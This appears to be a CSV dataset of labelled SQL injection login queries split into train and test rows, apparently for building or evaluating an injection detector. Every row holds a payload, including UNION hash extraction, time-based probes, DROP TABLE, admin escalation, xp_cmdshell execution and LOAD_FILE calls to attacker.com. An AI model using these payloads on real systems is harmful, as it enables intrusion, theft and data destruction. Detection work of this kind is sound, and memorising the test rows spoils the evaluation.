full_query,label,split
"SELECT id, name FROM users WHERE name='admin' AND SUBSTRING(username,1,1)='a' -- ' AND password_hash='$2b$12$dlySNcL7GiCIUTv/.zGcP5A1pw2dKEj0tbHU39VIsGp8mssQg1Stm'",1,test
"SELECT id, email FROM accounts WHERE email='admin' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) -- ' AND pw='Spring#2024'",1,test
"SELECT id, name FROM users WHERE name='admin' AND LOAD_FILE('\\\\attacker.com\\share') -- ' AND pwd='P@ssword2024!'",1,test
select * from auth_users where name='' OR EXISTS(SELECT 1) -- ' and pass_hash='c3fd9b17fcf9488404026745898a703fbde26656e426d15928bad01d93b88d70',1,test
"SELECT id, login FROM user_data WHERE login='' OR '1'='1' #' AND hashed_password='pbkdf2:sha256:600000$VGSkuOff$c4ee9e83ec2e4d414120c2a18304c3bae899e32004eded8c2076edc724bc8c60'",1,train
"SELECT id, username FROM app_users WHERE username='admin' AND SLEEP(5) -- ' AND pwd='monkey'",1,train
"SELECT id, login FROM user_accounts WHERE login='admin' OR 1=1/*' AND password_hash='$2b$12$Iozj7BeXWvw7bIXnAOTZ.PEcGUFZFS98LIQwnTD1lsdlKv.sqevAl'",1,test
SELECT * FROM user_data WHERE user_login='admin' AND password_hash='admin')) --',1,test
SELECT * FROM users WHERE user_login='admin' OR 0x61626364=0x61626364 -- ' AND pwd='secret123',1,test
SELECT * FROM members WHERE user_login='admin' AND (SELECT COUNT(*) FROM users)>0 -- ' AND password_hash='67c9fcc0b3c3df855a5a3d5a018bc553aedbec7d993e7c1e25362dc3490c15b5',1,test
"SELECT id, username FROM accounts WHERE username='' UNION ALL SELECT NULL,version(),NULL -- ' AND pwd='Pa$$w0rd!'",1,test
SELECT * FROM users WHERE name='admin'/*' AND password='letmein',1,train
select * from auth_users where email='admin'--' and pwd='nicoleivankovic''',1,test
SELECT * FROM user_data WHERE user_name='matija' AND pw='admin'; SELECT * INTO OUTFILE '/tmp/x' FROM users; -- ',1,test
SELECT * FROM app_users WHERE login='max' AND password='admin' AND CAST((SELECT user()) AS INT) -- ',1,test
"SELECT id, user_name FROM accounts WHERE user_name='admin'%09OR%09'1'='1' AND pw='MySecret123'",1,test
"SELECT * FROM auth_users WHERE name='' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables -- ' AND pass_hash='3b947e93dfc4e0494b9b9e09a2104ec6fc40fbedd40d93ac138b98646165ea45'",1,test
"SELECT id, login FROM user_accounts WHERE login='Alex1818'; UPDATE users SET is_admin=1; -- ' AND pwd='dragon'",1,test
select * from members where email='admin')) --' and pw='test''password',1,test
"select * from customers where user_login='pharmauser' and pw='' UNION SELECT username,password_hash FROM users -- '",1,test
select * from customers where user_name='') OR ('1'='1' and pwd='test''password',1,train
SELECT * FROM logins WHERE login='tomislav' AND pass_hash='Alex1818'; DROP TABLE users;-- ',1,test
SELECT * FROM user_accounts WHERE name='admin'; DROP TABLE products; DROP TABLE orders; -- ' AND hashed_password='pbkdf2:sha256:600000$geiyxjET$4f965043bc0a0c777ccfbd604999f9bf7e4a78e208b8a3c9726d4ac5d6949dc4',1,test
"SELECT id, email FROM app_users WHERE email='admin' AND SUBSTRING(username,1,1)='a' -- ' AND pwd='12345678'",1,test
"SELECT id, user_login FROM users WHERE user_login='admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) -- ' AND pass_hash='be7658f00c033ffd8db26c9fc8b991e5e05f025ac99d5bfb8ad48b7be8c14b14'",1,train
SELECT * FROM users WHERE username='admin' AND SLEEP(5) -- ' AND pw='password',1,test
"SELECT id, user_login FROM user_accounts WHERE user_login='admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) -- ' AND pwd='monkey'",1,test
"SELECT id, login FROM auth_users WHERE login='' OR 'a'='a' AND pass_hash='a2d569d034109360bd14c079d043af72a209ec02cb2ef6ed68f154ce1d3ff2b5'",1,test
"select * from app_users where user_login='admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) -- ' and hashed_password='$2b$12$/FOgIyeQVQnWZv7Uw4rR.JD2D2VdiytjrrsBrh9l/2eQkrmsVuiEc'",1,train
"SELECT * FROM user_accounts WHERE user_name='josip' AND pwd='admin' AND SUBSTRING(username,1,1)='a' -- '",1,test
"SELECT id, user_name FROM korisnici WHERE user_name='admin'; ALTER TABLE users ADD COLUMN backdoor INT; -- ' AND pass_hash='8d54a37ccb9cc52931334ed16c1d017e'",1,test
"SELECT id, name FROM user_accounts WHERE name='admin' AND 1=2 -- ' AND pwd='monkey'",1,train
"SELECT id, login FROM user_accounts WHERE login='' OR 'a'='a' -- ' AND pwd='letmein'",1,test
select * from user_accounts where user_name=''; EXEC xp_cmdshell('whoami'); -- ' and pw='monkey',1,test
select * from accounts where login='admin' AND pg_sleep(5) -- ' and pw='password',1,test
"SELECT * FROM user_accounts WHERE user_name='admin' AND SUBSTRING(username,1,1)='a' -- ' AND hashed_password='9cb7242f8a48bd4ef04e0b886405785b'",1,test
"SELECT id, login FROM logins WHERE login='x' UNION SELECT 1,2,3,user(),5,6,7,8,9,10 -- ' AND pw='Spring#2024'",1,test
SELECT * FROM user_data WHERE user_login='' OR 'x'='x' -- ' AND password_hash='pbkdf2:sha256:600000$qIeA56TT$abec1d38c65bc79fccb172b197ce1bee46302fe015addd089dc8a64a733e0c55',1,train
SELECT * FROM accounts WHERE login='admin' OR CHAR(49)=CHAR(49) -- ' AND pw='MySecret123',1,test
"SELECT id, user_login FROM members WHERE user_login='admin' Or '1'='1' AND pass_hash='094642d3af5f9ffe4fa693b4f9b2ca5a'",1,test
"SELECT id, user_login FROM korisnici WHERE user_login='admin'--' AND hashed_password='18ea969c6411f5f1e624f9f41ac7a4b9'",1,test
"SELECT * FROM customers WHERE name='root' AND pwd='' UNION SELECT NULL,NULL,NULL,NULL; -- '",1,test
"SELECT id, user_name FROM user_accounts WHERE user_name='marko' AND password='admin' AND SLEEP(5) -- '",1,test
"SELECT id, email FROM members WHERE email='admin' ; DROP TABLE test4; -- ' AND pass_hash='pbkdf2:sha256:600000$17v2qIsu$f996249bbb169f817fd5e186767f2ffe149100bf1c84347cac060274033bd6d6'",1,test
"SELECT id, username FROM customers WHERE username='' UNION SELECT username,password_hash FROM users -- ' AND password='it''s_a_pass'",1,test
SELECT * FROM user_data WHERE email='admin'; WAITFOR DELAY '0:0:5' -- ' AND password='it''s_a_pass',1,train
"SELECT * FROM app_users WHERE user_name='' UNION SELECT username,password_hash FROM users -- ' AND pass_hash='ee851ed886ab41bc9e1a1b71abdc99f911c169edce625b1aab5aa6b2570713a8'",1,train
select * from users where user_name='' OR 'a'='a' -- ' and pw='MySecret123',1,test
"SELECT id, username FROM user_data WHERE username='' OR 'x'='x' -- ' AND hashed_password='e0c5e7b90f1069b60e60110a7c63af7d'",1,test
SELECT * FROM auth_users WHERE email='admin')) --' AND password='password',1,test
SELECT * FROM customers WHERE user_login='user.name' AND pass_hash='admin' AND SLEEP(5) -- ',1,test
SELECT * FROM logins WHERE user_name='admin' AND (SELECT COUNT(*) FROM users)>0 -- ' AND password='P@ssword2024!',1,test
select * from user_accounts where user_login='Alex1818'; DROP TABLE users;-- ' and hashed_password='6e7309cf2ad4a93626b8b2ccf2208c9fca377b5aca4c1e4e12da522f42efd3df',1,train
select * from logins where user_name='admin'-- -' and password='monkey',1,test
SELECT * FROM customers WHERE email='admin@company.org' AND pw='' OR '1'='1'-- ',1,train
select * from user_data where login='admin@company.org' and password='admin'/**/OR/**/'1'='1',1,test
"select * from app_users where user_name='O''Brien' and pwd='admin' OR IF(1=1, SLEEP(5), 0) -- '",1,train
SELECT * FROM auth_users WHERE user_name='admin' OR 1=1/*' AND pw='monkey',1,test
select * from user_data where email='admin' AND LOAD_FILE('\\\\attacker.com\\share') -- ' and password_hash='123d7f7b5227604e9d4026ff1c3258e5',1,test
"SELECT * FROM app_users WHERE name='admin' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) -- ' AND hashed_password='pbkdf2:sha256:600000$h2eb4Rj5$14329aa4fe07a60e5060aa84a8469895936696b8638330182545be17725c6a26'",1,train
select * from app_users where username='' OR ''='' and pass_hash='06a6d4e3d7f9419272e0377145e39f34',1,test
"SELECT id, user_name FROM user_data WHERE user_name='admin' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1) -- ' AND pwd='secret123'",1,test
SELECT * FROM users WHERE login='admin' Or '1'='1' AND password='root_password',1,train
"SELECT id, email FROM members WHERE email='contact' AND pass_hash='admin')) --'",1,test
"SELECT id, username FROM users WHERE username=''; EXEC xp_cmdshell('whoami'); -- ' AND hashed_password='pbkdf2:sha256:600000$aUiwAFXa$f64354a87b8ab44d60205af872fbb22e5a16ba48d889f79efb016b8b21d3fa94'",1,test
SELECT * FROM auth_users WHERE user_login='Alex1818'; UPDATE users SET is_admin=1; -- ' AND password='MySecret123',1,test
"SELECT id, user_login FROM accounts WHERE user_login='' OR 'a'='a' -- ' AND pw='S3cur3P@ss'",1,test
SELECT * FROM auth_users WHERE user_login='admin'; ALTER TABLE users ADD COLUMN backdoor INT; -- ' AND pass_hash='4dad08c131758cbbffead643049522d3',1,train
SELECT * FROM korisnici WHERE login='viserionnina' AND password='admin' OR 1=1/*',1,test
"SELECT * FROM accounts WHERE user_login='admin' OR IF(1=1, SLEEP(1), 0); -- ' AND pw='it''s_a_pass'",1,train
"SELECT id, username FROM auth_users WHERE username='' OR 'a'='a' -- ' AND pw='Welcome123$'",1,test
"SELECT id, user_login FROM members WHERE user_login='admin' AND pg_sleep(5) -- ' AND hashed_password='$2b$12$8yHg/Zg6f/1iUevqUB7ow4Sq//TChpVbD7/wwRSDiqPCOWboDi6bb'",1,test
"SELECT id, username FROM user_data WHERE username='' UNION ALL SELECT NULL,version(),NULL -- ' AND pass_hash='$2b$12$U1MXeicnocJQPQGxbSZiIVQBe4SWcLfv5QccYZNEfqeGyX3qP1X0o'",1,test
"SELECT id, name FROM logins WHERE name='' UNION SELECT NULL,NULL,NULL -- ' AND pass_hash='bdde4cdb02b570ea226cba1d6cf1da55'",1,test
select * from members where email='user123' and password='admin' AND SLEEP(5) -- ',1,test
select * from user_data where login='admin'/**/OR/**/'1'='1' and password='12345678',1,test
"SELECT id, user_login FROM user_accounts WHERE user_login='contact' AND pwd='admin'; UPDATE users SET is_admin=1 WHERE username='Alex1818'; -- '",1,test
select * from accounts where email='O''Brien' and password='admin' OR 1=1/*',1,train
SELECT * FROM app_users WHERE name='admin'; DROP TABLE users; -- ' AND password='admin123',1,test
"SELECT * FROM customers WHERE user_name='admin' OR IF(1=1, SLEEP(5), 0) -- ' AND pwd='P@ssword2024!'",1,test
SELECT * FROM users WHERE name='admin'; DROP TABLE products; DROP TABLE orders; -- ' AND password_hash='$2b$12$IQeb.yM.q1GX/X5gYD4QCdIZGfXLp4eOm9uhqGSekHvBmrcFEP4K/',1,test
"SELECT id, name FROM auth_users WHERE name='admin'; UPDATE users SET is_admin=1 WHERE username='Alex1818'; -- ' AND pw='Welcome123$'",1,test
"SELECT id, user_login FROM customers WHERE user_login='' OR '1'='1' #' AND pw='Pa$$w0rd!'",1,test
SELECT * FROM app_users WHERE email='') OR ('1'='1' AND hashed_password='3f6f6b90bc7e3746e4baced6b8b70e92',1,train
"SELECT id, email FROM members WHERE email='admin' ; DROP TABLE test4; -- ' AND password='password'",1,test
"SELECT id, user_login FROM auth_users WHERE user_login='admin' #' AND pass_hash='pbkdf2:sha256:600000$vpDfM2K5$7fe0aefd3dd7560cc9a2c098704a910eda0dda10dcac6dabe483bede86e1ac6d'",1,test
select * from members where email='admin'; TRUNCATE TABLE logs; -- ' and pwd='Welcome2024',1,train
select * from korisnici where email='admin') --' and password='password',1,train
"SELECT id, email FROM logins WHERE email='admin' OR 1=1 -- ' AND password_hash='00c681fb6334f168fbd2269f51378b133aab53d5ef6be93585f21b23e6f080b2'",1,train
"SELECT id, login FROM customers WHERE login='admin' AND IF(1=1,SLEEP(5),0) -- ' AND password='S3cur3P@ss'",1,test
"SELECT * FROM korisnici WHERE username='' UNION SELECT 1,2,3,4 -- ' AND pass_hash='075645f90ccd18a1d5c759a1551f9cdd'",1,test
SELECT * FROM user_accounts WHERE username='admin' AND 1=2 -- ' AND pwd='Welcome2024',1,test
"SELECT id, login FROM users WHERE login='' UNION SELECT username,password_hash FROM users -- ' AND password_hash='$2b$12$1w1ucjlonCkPIaOa9llatg0cwP2ndKzdQul0zDiJ4JuPGgruUBVCH'",1,test
select * from members where email='admin@company.org' and pw='admin' OR 1=1 -- ',1,test
select * from members where user_login='henry' and pwd='admin'%09OR%09'1'='1',1,test
"SELECT id, email FROM accounts WHERE email='admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) -- ' AND hashed_password='$2b$12$.aKILYLm97QuAnRotQgMtLo1w7ioKGxJKbW/Y.8bkTA4bituf7Ht4'",1,test
"SELECT id, name FROM customers WHERE name='' UNION SELECT username,password_hash FROM users -- ' AND password_hash='d57fc3aa15e3dc53e98539b960cc2cf5'",1,test
"select * from members where email='' UNION SELECT NULL,NULL,NULL,NULL; -- ' and hashed_password='50fdb1724387e9e63dec9d889603ded0'",1,train
"SELECT id, user_name FROM members WHERE user_name='admin' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1) -- ' AND hashed_password='$2b$12$CnhVqrzfviQOWeAijHQHmVHjFCwqi.Zdfr5uUf7V.Jh1D0tzVo/hC'",1,test
"SELECT id, username FROM users WHERE username='' UNION SELECT username,password_hash FROM users -- ' AND pwd='12345678'",1,test
"SELECT * FROM users WHERE login='admin' AND SUBSTRING(username,1,1)='a' -- ' AND pass_hash='pbkdf2:sha256:600000$0CYOfP9e$1ee483791399b75867f9991f029fdbfb9efac923f5a3dd703d152e1b2ba4258d'",1,test
SELECT * FROM members WHERE login='' OR 'a'='a' AND pw='Pa$$w0rd!',1,test
"SELECT id, name FROM user_accounts WHERE name='admin'; UPDATE users SET is_admin=1 WHERE username='Alex1818'; -- ' AND password_hash='$2b$12$vcGIIrqBI5JbAX.pqZeH3JQrgDD1maZQniyuetqIqm5..kvxpcihN'",1,test
"SELECT id, login FROM korisnici WHERE login='user@gmail.com' AND pw='' OR ''=''",1,test
SELECT * FROM members WHERE email='admin'; SELECT * INTO OUTFILE '/tmp/x' FROM users; -- ' AND pw='dragon',1,test
"select * from logins where name='' UNION SELECT username,password_hash FROM users -- ' and hashed_password='24002ca3edd7491ffcc2258d51e8b98901fa3192a3d6f1bbbe3f428308a327e2'",1,test
"SELECT id, email FROM auth_users WHERE email='admin' AND IF(1=1,SLEEP(5),0) -- ' AND pwd='it''s_a_pass'",1,test
"SELECT id, user_name FROM korisnici WHERE user_name='admin' AND SUBSTRING(username,1,1)='a' -- ' AND pw='admin123'",1,train
"select * from members where user_login='user@gmail.com' and hashed_password='' UNION SELECT NULL,NULL,NULL,NULL; -- '",1,test
select * from user_accounts where user_name='' OR '1'='1'-- ' and pass_hash='$2b$12$UweHfU.M.IyFuNJRaMhjy2.60gu9.Mx/jHdCAxOtn5nQqA4SbRfsn',1,train
"SELECT id, email FROM app_users WHERE email='admin'/*!50000OR*/'1'='1' AND pass_hash='$2b$12$Hk.JD/sSjQWWfF3Pkvn9DIw60RtwVe3TaLondntE/pJn.gnoeoljK'",1,test
select * from users where username='admin'; UPDATE users SET is_admin=1 WHERE id=1; -- ' and pwd='Welcome123$',1,test
select * from logins where username='ad'||'min' OR '1'='1' and hashed_password='eef60dbe3273a11b368cb6403f54521a',1,test
select * from customers where name='' OR '1'='1' and pwd='Welcome123$',1,test
SELECT * FROM accounts WHERE name='admin'; UPDATE users SET is_admin=1 WHERE id=1; -- ' AND pwd='P@ssword2024!',1,test
"select * from auth_users where user_login='admin' AND ASCII(SUBSTRING(@@version,1,1))>52 -- ' and password_hash='pbkdf2:sha256:600000$ylU2HIhg$b9218fa97dd05bab557c0fbaa0527b96f0cfbe1404e8ce58ef33585ec18244d0'",1,test
"SELECT id, login FROM members WHERE login='pacijent_001' AND pwd='admin' OR 0x31=0x31 -- '",1,test
SELECT * FROM auth_users WHERE login='maja' AND password_hash=''; CREATE USER hacker WITH SUPERUSER; -- ',1,test
"SELECT id, user_name FROM members WHERE user_name='admin' ; DROP TABLE test1; -- ' AND pass_hash='pbkdf2:sha256:600000$cJAkqU2d$b48e23c0466f111a87070eeaeea80834492132ee61f7de21b912b756150329f0'",1,test
"SELECT * FROM user_data WHERE email='' UNION SELECT NULL,NULL,NULL,NULL; -- ' AND pass_hash='$2b$12$l5jtFFTttjc5Xn8dpUY7Ax3vKMMpDbrZsGPrADsTnn.ubkpy8vE1V'",1,test
"SELECT id, login FROM user_data WHERE login='' UNION SELECT 1,table_name,3 FROM information_schema.tables -- ' AND hashed_password='330d661b7e20361bfec878395dc36b1d'",1,test
select * from user_accounts where name='admin' AND (SELECT COUNT(*) FROM users)>0 -- ' and pw='root_password',1,train
"SELECT id, user_name FROM customers WHERE user_name='admin'-- -' AND password_hash='68d319edf98ad43736f7e8f2a0701ad54caf02064938c59ddffd0aa080632fb9'",1,test
SELECT * FROM user_data WHERE user_name='mike@example.com' AND password_hash='admin'; UPDATE users SET is_admin=1 WHERE username='Alex1818'; -- ',1,test
"SELECT id, login FROM auth_users WHERE login='ljekarna_zg' AND password='admin' AND 1=1 -- '",1,test
"SELECT id, name FROM logins WHERE name='admin' AND LENGTH(database())>5 -- ' AND password_hash='$2b$12$myf5RwZ.gADaLaHDejLsqYxgMrT9cu3CDddaE45dXIHK470O.Fk.K'",1,test
SELECT * FROM users WHERE name='John''s' AND pw='' OR 1=1#',1,test
SELECT * FROM app_users WHERE name='matija' AND pass_hash='' OR EXISTS(SELECT 1) -- ',1,test
SELECT * FROM users WHERE username='admin' ; DROP TABLE test4; -- ' AND pwd='secret123',1,test
"select * from app_users where name='bob' and pw='admin' OR IF(1=1, SLEEP(5), 0) -- '",1,test
"SELECT id, email FROM members WHERE email='1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ' AND hashed_password='3df8c14f61f2f82b008e2fe560690d31'",1,test
select * from members where username='admin' AND LOAD_FILE('\\\\attacker.com\\share') -- ' and password='nicoleivankovic''',1,test
"select * from members where user_login='emma' and pass_hash='' UNION SELECT username,password_hash FROM users -- '",1,test
"SELECT id, username FROM user_data WHERE username='admin') --' AND pwd='qwerty'",1,test
SELECT * FROM korisnici WHERE user_name='' OR 'a'='a' AND hashed_password='8b4fb0584008e89af6e7c18fabb6960a',1,test
select * from users where login='nicoleivankovic' and password='' OR 1=1 -- ',1,test
select * from members where user_login='admin'-- -' and pwd='MyPharm@99',1,test
"SELECT id, user_name FROM accounts WHERE user_name='admin' ; DROP TABLE test4; -- ' AND pw='nicoleivankovic'''",1,train
"SELECT id, user_name FROM user_accounts WHERE user_name=''; EXEC xp_cmdshell('whoami'); -- ' AND password_hash='pbkdf2:sha256:600000$PgwZQikj$b20fce243861b71fd82c1e2be2571607ffec56191bf7d3c3d265dd2247f41f1d'",1,test
"select * from customers where user_name='admin' AND ASCII(SUBSTRING(@@version,1,1))>52 -- ' and pwd='qwerty'",1,test
SELECT * FROM app_users WHERE user_login='admin' AND CAST((SELECT user()) AS INT) -- ' AND password='P@ssword2024!',1,test
"select * from app_users where user_login='admin' AND ASCII(SUBSTRING(@@version,1,1))>52 -- ' and pass_hash='d1a5f77193d99e8c6f83118e62ed14119922c455463eb8316aa249d84e7593ce'",1,test
